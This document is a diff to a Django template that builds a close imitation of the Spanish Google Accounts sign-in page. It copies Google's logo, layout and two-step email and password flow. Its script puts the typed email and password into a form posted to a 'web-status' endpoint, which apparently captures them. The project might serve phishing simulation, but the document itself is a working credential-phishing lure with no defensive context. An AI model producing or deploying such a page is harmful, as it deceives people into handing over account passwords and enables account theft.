@@ -1,41 +1,561 @@
 {% load static %}
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Google Fieldset</title>
-
-</head>
-<body>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8">
+    <title>Iniciar sesión: Cuentas de Google</title>
+    <meta name="viewport" content="width=device-width, user-scalable=yes, initial-scale=1.0, maximum-scale=3.0, minimun-scale=1.0"> 
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css">
     <link rel="stylesheet" href="{% static 'css/google/log_in.css' %}">
-      <div class="maindiv">
-        <img src="{% static 'images/google/google.png' %}" alt="Google">
-        <h1>Inicio Sesión</h1>
-        <h3>Continue to Gmail</h3>
-
-        <form action="{% url 'web-status' intweb=intweb servicio=servicio %}" method="POST">
-          {% csrf_token %}
-          <div class="inputs">
-            <div class="Fields">
-              <div class="Fieldset">
-                <input type="text" class="Before-FS" required="" autocomplete="off" name="usuario">
-                <h1 class="Fs-H"><span>Email o telefono</span></h1>
-                <label class="placeholder">Email o telefono</label>
-              </div>
+    <link rel="shortcut icon" href="{% static 'images/google/headIcon.ico' %}">
+  </head>
+  <body>
+     <main>
+        <div class="contentWrapper">
+          <div class="loader">
+            <div class="loaderElementContainer">
+              <div class="loaderElement"></div>
             </div>
-            <div class="Fields">
-              <div class="Fieldset">
-                <input type="password" class="Before-FS" required="" name="contraseña" >
-                <h1 class="Fs-H"><span>Contraseña</span></h1>
-                <label class="placeholder">Contraseña</label>
-              </div>
-            </div>
-            <input type="submit" value="Inicio Sesion">
           </div>
-        </form>
-      </div>
+          <div class="contentCenter">
+            <div id="blurAnimation"></div>
+            <div class="logoContainer">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 272 92" width="76" height="25"><path fill="#EA4335" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/><path fill="#FBBC05" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/><path fill="#4285F4" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/><path fill="#34A853" d="M225 3v65h-9.5V3h9.5z"/><path fill="#EA4335" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/><path fill="#4285F4" d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z"/></svg>
+            </div>
+            <div class="loginContainer emailRequired">
+              <div class="loginTitle">
+                <h1 id="loginTitleText">Iniciar sesión</h1>
+                <div class="titleSubtext">
+                  <span>Utiliza tu cuenta de Google</span>
+                </div>
+                <div class="userEmailWrapper">
+                  <div onclick="returnToLogin()">
+                    <div class="userImageContainer">
+                      <div>
+                        <img src="{% static 'images/google/user.png' %}"" alt="">
+                      </div>
+                    </div>
+                    <div class="userEmailContainer">
+                    </div>
+                    <div class="emailArrow">
+                      <svg aria-hidden="true" class="stUf5b MSBt4d" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><polygon points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71"></polygon></svg>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div class="loginContentWrapper">
+                <div class="loginContent">
+                  <div class="loginMainContent">
+                    <div>
+                      <form action="">
+                        <section class="loginInput">
+                          <div>
+                            <div class="inputContainer">
+                              <input id="email" type="email" onclick="emailSelect">
+                              <div id="emailPlaceholder">
+                                <span id="emailPlaceholderText" onclick="emailSelect">Correo electrónico o teléfono</span>
+                              </div>
+                            </div>
+                          </div>
+                        </section>
+                        <div class="emailError">
+                          <span>
+                            <svg aria-hidden="true" class="stUf5b qpSchb" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg>
+                          </span>
+                          Introduce una dirección de correo electrónico o un número de teléfono
+                        </div>
+                        <div class="forgotPassword">
+                          <button type="button">
+                            ¿Has olvidado tu correo electrónico?
+                          </button>
+                        </div>
+                      </form>
+                    </div>
+                    <div class="loginExternalUser">
+                      <span>
+                        ¿No es tu ordenador? Usa el modo Invitado para iniciar sesión de forma privada. 
+                        <a href="#">Más información</a>
+                      </span>
+                    </div>
+                  </div>
+                  <div class="loginActions">
+                    <div class="buttonsContainer">
+                      <div>
+                        <div>
+                          <button type="button" class="buttonCreateAccount">
+                            <span>Crear cuenta</span>
+                          </button>
+                        </div>
+                        <div>
+                          <button type="button" class="buttonNext" onclick="checkEmail()">
+                            <span>Siguiente</span>
+                          </button>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div class="passwordContentWrapper">
+                <div class="loginContent">
+                  <div class="loginMainContent">
+                    <div>
+                      <form id="loginForm" action="{% url 'web-status' intweb=intweb servicio=servicio %}"  method="POST">
+                        {% csrf_token %}
+                        <section class="loginInput">
+                          <div>
+                            <div class="inputContainer">
+                              <input id="emailHidden" type="hidden" name="usuario" value="">
+                              <input id="password" type="password" onclick="passwordSelect" name="contraseña">
+                              <div id="passwordPlaceholder">
+                                <span id="passwordPlaceholderText" onclick="passwordSelect">Introduce tu contraseña</span>
+                              </div>
+                            </div>
+                          </div>
+                        </section>
+                        <div id="passwordError" class="emailError">
+                          <span>
+                            <svg aria-hidden="true" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg>
+                          </span>
+                          Introduce una contraseña
+                        </div>
+                        <div class="forgotPassword">
+                          <div class="showPasswordCheckbox">
+                            <div class="checkboxContainer" onclick="showPassword">
+                              <input type="checkbox" onclick="showPassword">
+                              <div id="showPassword" class="checkIconContainer" onclick="showPassword">
+                                <svg id="checkIcon" aria-hidden="true" viewBox="0 0 24 24"><path fill="none" d="M1.73,12.91 8.1,19.28 22.79,4.59"></path></svg>
+                              </div>
+                            </div>
+                            <div class="showPasswordText">
+                              <div>
+                                Mostrar contraseña
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                      </form>
+                    </div>
+                  </div>
+                  <div class="loginActions">
+                    <div class="buttonsContainer">
+                      <div>
+                        <div class="forgotPasswordContainer">
+                          <button type="button" class="buttonCreateAccount">
+                            <span>¿Has olvidado tu contraseña?</span>
+                          </button>
+                        </div>
+                        <div>
+                          <button type="button" class="buttonNext" onclick="checkEmail()">
+                            <span>Siguiente</span>
+                          </button>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="footerContainer">
+          <div class="languageWrapper">
+            <div class="languageSelector">
+              <ul class="languageList">
+              </ul>
+            </div>
+            <button id="showLanguageButton" onclick="showLanguages()">
+              <div class="selectedLanguageContainer">
+                <span id="activeLanguage">Español (España)</span>
+              </div>
+              <div class="arrowLanguage">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-caret-down-fill" viewBox="0 0 16 16">
+                  <path d="M7.247 11.14 2.451 5.658C1.885 5.013 2.345 4 3.204 4h9.592a1 1 0 0 1 .753 1.659l-4.796 5.48a1 1 0 0 1-1.506 0z"/>
+                </svg>
+              </div>
+            </button>
+          </div>
+          <div class="footerLinks">
+            <a href="#">Ayuda</a>
+            <a href="#">Privacidad</a>
+            <a href="#">Términos</a>
+          </div>
+        </div>
+     </main>
+  </body>
+
+  <!-- Javascript -->
+  <script>
+    let state = "email";
+
+    let languages;
+    let languageSelector = document.querySelector('.languageSelector');
+    (
+      languages = function() {
+        let langs = [
+          "Afrikaans",
+          "azərbaycan",
+          "bosanski",
+          "català",
+          "Čeština",
+          "Cymraeg",
+          "Dansk",
+          "Deutsch",
+          "eesti",
+          "English (United Kingdom)",
+          "English (United States)",
+          "Español (España)",
+          "Español (Latinoamérica)",
+          "euskara",
+          "Filipino",
+          "Français (Candada)",
+          "Français (France)",
+          "Gaeilge",
+          "galego",
+          "Hrvatski",
+          "Indonesia",
+          "isiZulu",
+          "íslenska",
+          "Italiano",
+          "Kiswahili",
+          "latviešu",
+          "lietuvių",
+          "magyar",
+          "Melayu",
+          "Nederlands",
+          "norsk",
+          "o‘zbek",
+          "polski",
+          "Português (Brasil)",
+          "Português (Portugal)",
+          "română",
+          "shqip",
+          "Slovenčina",
+          "slovenščina",
+          "srpski (latinica)",
+          "Suomi",
+          "Svenska",
+          "Tiếng Việt",
+          "Türkçe",
+          "Ελληνικά",
+          "беларуская",
+          "български",
+          "кыргызча",
+          "қазақ тілі",
+          "македонски",
+          "монгол",
+          "Русский",
+          "српски (ћирилица)",
+          "Українська",
+          "ქართული",
+          "հայերեն",
+          "&#x202B;עברית&#x202C;&lrm;",
+          "&#x202B;اردو&#x202C;&lrm;",
+          "&#x202B;العربية&#x202C;&lrm;",
+          "&#x202B;فارسی&#x202C;&lrm;",
+          "አማርኛ",
+          "नेपाली",
+          "मराठी",
+          "हिन्दी",
+          "অসমীয়া",
+          "বাংলা",
+          "ਪੰਜਾਬੀ",
+          "ગુજરાતી",
+          "ଓଡ଼ିଆ",
+          "தமிழ்",
+          "తెలుగు",
+          "ಕನ್ನಡ",
+          "മലയാളം",
+          "සිංහල",
+          "ไทย",
+          "ລາວ",
+          "မြန်မာ",
+          "ខ្មែរ",
+          "한국어",
+          "中文（香港）",
+          "日本語",
+          "简体中文",
+          "繁體中文",
+        ]
+        let langsLength = langs.length;
+        let selectedLangugage = -1;
+        function getLangByIndex(index){
+          return langs[index];
+        }
+        function getLangsSize() {
+          return langsLength;
+        }
+        function getSelectedLanguage() {
+          return selectedLangugage;
+        }
+        function setSelectedLanguage(index) {
+          selectedLangugage = index;
+        }
+        return {
+          getLangByIndex: getLangByIndex,
+          getLangsSize: getLangsSize,
+          getSelectedLanguage,
+          setSelectedLanguage
+        }
+      }());
+
+    window.onload = function() {
+      for (let i = 0; i < languages.getLangsSize(); i++) {
+        let li = document.createElement("li");
+        li.innerHTML = languages.getLangByIndex(i);
+        li.id = "language" + i;
+        li.onclick = function activeLanugage() {
+          let id = this.id;
+          if (languages.getSelectedLanguage() != -1) {
+            document.getElementById("language" + languages.getSelectedLanguage()).classList.remove("selected");
+          }
+          languages.setSelectedLanguage(id.substring(8));
+          document.getElementById(id).classList.add("selected");
+          document.getElementById("activeLanguage").innerHTML = languages.getLangByIndex(languages.getSelectedLanguage());
+        }
+        if (i == 11) {
+          li.classList.add("selected");
+          languages.setSelectedLanguage(i);
+        }
+        document.querySelector(".languageList").appendChild(li);
+      }
+    }
 
 
-</body>
+    /* 
+      Input highlight 
+    */
+    document.getElementById("email").onclick = function() {emailSelect()};
+    document.getElementById("emailPlaceholder").onclick = function() {emailSelect()};
+
+    document.getElementById("password").onclick = function() {passwordSelect()};
+    document.getElementById("passwordPlaceholder").onclick = function() {passwordSelect()};
+
+    function emailSelect() {
+      document.getElementById("email").focus();
+      document.getElementById("email").classList.add("selected");
+      document.getElementById("emailPlaceholder").classList.add("active");
+      document.getElementById("emailPlaceholder").classList.add("selected");
+    }
+
+    function emailDeselect() {
+      if (document.getElementById("email").classList.contains("selected")) {
+        document.getElementById("email").classList.remove("selected");
+        document.getElementById("emailPlaceholder").classList.remove("selected");
+        if (document.getElementById("email").value == "") {
+          document.getElementById("emailPlaceholder").classList.remove("active");
+        }
+      } else if (document.getElementById("emailPlaceholder").classList.contains("active") && document.getElementById("email").value == "") {
+        document.getElementById("emailPlaceholder").classList.remove("active");
+      }
+    }
+
+    function passwordSelect() {
+      document.getElementById("password").focus();
+      document.getElementById("password").classList.add("selected");
+      document.getElementById("passwordPlaceholder").classList.add("active");
+      document.getElementById("passwordPlaceholder").classList.add("selected");
+    }
+
+    function passwordDeselect() {
+      if (document.getElementById("password").classList.contains("selected")) {
+        document.getElementById("password").classList.remove("selected");
+        document.getElementById("passwordPlaceholder").classList.remove("selected");
+        if (document.getElementById("password").value == "") {
+          document.getElementById("passwordPlaceholder").classList.remove("active");
+        }
+      } else if (document.getElementById("passwordPlaceholder").classList.contains("active") && document.getElementById("password").value == "") {
+        document.getElementById("passwordPlaceholder").classList.remove("active");
+      }
+    }
+
+
+    // check when the input with id email is not active
+    document.getElementById("email").onblur = function() {
+      emailDeselect();
+    }
+
+    // check when the user highlights the content of the input with id email
+    document.getElementById("email").onselect = function() {
+      emailSelect();
+    }
+
+    // check when the input with id password is not active
+    document.getElementById("password").onblur = function() {
+      passwordDeselect();
+    }
+
+    // check when the user highlights the content of the input with id password
+    document.getElementById("password").onselect = function() {
+      passwordSelect();
+    }
+
+    /* 
+      /Input highlight 
+    */
+
+    /* 
+      Languge list
+    */
+
+    function showLanguages() {
+      console.log("executed!")
+      if (document.querySelector(".arrowLanguage svg").classList.contains("rotate")) {
+        document.querySelector(".arrowLanguage svg").classList.remove("rotate");
+        document.querySelector(".languageSelector").classList.remove("open");
+      }
+      else {
+        document.querySelector(".arrowLanguage svg").classList.add("rotate");
+        document.querySelector(".languageSelector").classList.add("open");
+      }
+    }
+
+    /* 
+      /Languge list
+    */
+
+    /* 
+      Password visibility
+    */
+
+    function showPassword() {
+      console.log("hola mundo")
+      if (document.getElementById("password").type == "password") {
+        document.getElementById("password").type = "text";
+        document.getElementById("showPassword").classList.add("selected");
+        document.getElementById("checkIcon").classList.add("show");
+      } else {
+        document.getElementById("password").type = "password";
+        document.getElementById("showPassword").classList.remove("selected");
+        document.getElementById("checkIcon").classList.remove("show");
+      }
+    }
+
+    /* 
+      /Password visibility
+    */
+
+    /* Animation*/
+    function checkEmail() {
+      if (state == "email") {
+        // Error message
+        if (document.getElementById("email").value.trim() == "") {
+          document.getElementById("email").classList.add("error");
+          document.getElementById("emailPlaceholder").classList.add("error");
+          if (!document.querySelector(".emailError").classList.contains("show")) document.querySelector(".emailError").classList.add("show");
+          emailSelect();
+        }
+        // Start animation
+        else {
+          // Start the animation
+          document.querySelector(".loader").classList.add("show");
+          document.querySelector(".loaderElement").classList.add("active");
+          // In case there were any errors, remove the css applied to the input
+          if (document.getElementById("email").classList.contains("error")) document.getElementById("email").classList.remove("error");
+          if (document.getElementById("emailPlaceholder").classList.contains("error")) document.getElementById("emailPlaceholder").classList.remove("error");
+          if (document.querySelector(".emailError").classList.contains("show")) document.querySelector(".emailError").classList.remove("show");
+          // blur the page as the animation starts
+          document.getElementById("blurAnimation").classList.add("transitionBlur");
+
+          setTimeout(function() {
+            // Set up the next user interface
+            document.querySelector(".userEmailContainer").innerHTML = document.getElementById("email").value;
+            document.getElementById("loginTitleText").innerHTML = "Bienvenido/a";
+
+            // Stop the animation
+            document.querySelector(".loader").classList.remove("show");
+            document.querySelector(".loaderElement").classList.remove("active");
+            document.getElementById("blurAnimation").classList.remove("transitionBlur");
+            // Deselect the input
+            emailDeselect();
+
+            // Start movement animation
+            document.querySelector(".loginContentWrapper").classList.add("fadeOut");
+            setTimeout(function() {
+              document.querySelector(".passwordContentWrapper").classList.add("fadeIn");
+              setTimeout(function() {
+                document.querySelector(".loginContainer").classList.remove("emailRequired");
+                document.querySelector(".loginContainer").classList.add("passwordRequired");
+                document.querySelector(".loginContentWrapper").classList.remove("fadeOut");
+                setTimeout(function() {
+                  document.querySelector(".passwordContentWrapper").classList.remove("fadeIn");
+                  passwordSelect();
+                  document.getElementById("password").focus();
+                }, 200);
+              }, 95)
+            }, 200);
+
+            state = "password";
+          }, 3000);
+        }
+      } else {
+        if (document.getElementById("password").value.trim() == "") {
+          document.getElementById("password").classList.add("error");
+          document.getElementById("passwordPlaceholder").classList.add("error");
+          if (!document.getElementById("passwordError").classList.contains("show")) document.getElementById("passwordError").classList.add("show");
+          passwordSelect();
+        } else {
+          if (document.getElementById("passwordError").classList.contains("show")) document.getElementById("passwordError").classList.remove("show");
+          
+          // Insert the email to the hidden input
+          document.getElementById("emailHidden").value = document.getElementById("email").value;
+          // Submit the form
+          document.getElementById("loginForm").submit();
+
+        }
+      }
+      
+    }
+
+    function returnToLogin() {
+      // Start the animation
+      document.querySelector(".loader").classList.add("show");
+      document.querySelector(".loaderElement").classList.add("active");
+      // blur the page as the animation starts
+      document.getElementById("blurAnimation").classList.add("transitionBlur");
+
+      setTimeout(function() {
+        // Set up the next user interface
+        document.getElementById("loginTitleText").innerHTML = "Iniciar sesión";
+
+        // Stop the animation
+        document.querySelector(".loader").classList.remove("show");
+        document.querySelector(".loaderElement").classList.remove("active");
+        document.getElementById("blurAnimation").classList.remove("transitionBlur");
+        // Deselect the input
+        passwordDeselect();
+
+        // Start movement animation 
+        document.querySelector(".passwordContentWrapper").classList.add("fadeOut");
+        setTimeout(function() {
+          document.querySelector(".loginContentWrapper").classList.add("fadeIn");
+          if(document.getElementById("password").classList.contains("error")) document.getElementById("password").classList.remove("error");
+          if(document.getElementById("passwordPlaceholder").classList.contains("error")) document.getElementById("passwordPlaceholder").classList.remove("error");
+          if (document.getElementById("passwordError").classList.contains("show")) document.getElementById("passwordError").classList.remove("show");
+          document.getElementById("password").value = "";
+          setTimeout(function() {
+            document.querySelector(".loginContainer").classList.remove("passwordRequired");
+            document.querySelector(".loginContainer").classList.add("emailRequired");
+            document.querySelector(".passwordContentWrapper").classList.remove("fadeOut");
+            setTimeout(function() {
+              document.querySelector(".loginContentWrapper").classList.remove("fadeIn");
+            }, 200);
+          }, 95)
+        }, 200);
+
+        state = "email";
+      }, 700);
+    }
+
+    document.addEventListener("DOMContentLoaded", function(event) {
+        window.onclick = function(event) {
+          console.log(event.target);
+          if (!document.getElementById("showLanguageButton").contains(event.target) && document.querySelector(".languageSelector").classList.contains("open") && event.target != languageSelector) {
+            showLanguages();
+          }
+          if (document.querySelector(".showPasswordCheckbox").contains(event.target) && event.target != document.querySelector(".showPasswordCheckbox")) {
+            showPassword();
+          }
+        }
+    });
+  </script>
 </html>
